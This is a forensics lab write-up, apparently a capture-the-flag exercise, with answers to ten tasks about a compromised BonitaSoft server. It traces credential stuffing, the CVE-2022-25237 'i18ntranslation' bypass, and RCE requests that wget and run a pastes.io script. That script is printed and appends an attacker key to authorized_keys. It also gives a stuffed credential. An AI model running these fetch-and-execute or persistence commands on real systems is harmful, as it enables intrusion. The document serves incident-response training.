# Meerkat

### Scenario
As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren't the most security aware. As our new security provider we'd like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

### Analysis

* Filtering the packages based on `http`.
* From this, we can get that some portal of Bonita `http://forela.co.uk:8080/bonita/portal/homepage`  is used.
* Searching online about `bonita` we get the `Business Management Platform server`.

**Task 1: We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?**
> BonitaSoft

* From the logs, we can see multiple requests are made to `http://forela.co.uk:8080/bonita/loginservice`
* Multiple username and passwords are used to check the credential

**Task 2: We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?**
> Credential Stuffing

* Going the through the logs, we can find request made to `POST /bonita/API/pageUpload;i18ntranslation?action=add HTTP/1.1\r\n`
* Searching online about this, we can find a public CVE against BonitaSoft

**Task 3: Does the vulnerability exploited have a CVE assigned - and if so, which one?**
> CVE-2022-25237

**Task 4: Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?**
> i18ntranslation

* Filtering and based on `http.request.method == POST`
* Counting still first successful request, got 56 attempts.


**Task 5: How many combinations of usernames and passwords were used in the credential stuffing attack?**
> 56

* Going through all the checks. we will find the value credentials with successfull response: "username" = "seb.broom@forela.co.uk" and "password" = "g0vernm3nt"

**Task 6: Which username and password combination was successful?**
> seb.broom@forela.co.uk:g0vernm3nt

* Filtering based on the HTTP get requests (`http.request.method==GET`), we get that following requests were made:
 * /bonita/API/extension/rce?p=0&c=1&cmd=whoami
 * /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8
 * /bonita/API/extension/rce?p=0&c=1&cmd=bash%20bx5gcr0et8

**Task 7: If any, which text sharing site did the attacker utilise?**
> pastes.io

* Getting the contents from `paste.io` website,
```
$ curl -k https://pastes.io/raw/bx5gcr0et8
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

**Task 8: Please provide the filename of the public key used by the attacker to gain persistence on our host.**
> hffgra4unv

**Task 9: Can you confirmed the file modified by the attacker to gain persistence?**
> /home/ubuntu/.ssh/authorized_keys

* Searching online about this techinque will give use the MITRE technique ID for it.

**Task 10: Can you confirm the MITRE technique ID of this type of persistence mechanism?**
> T1098.004

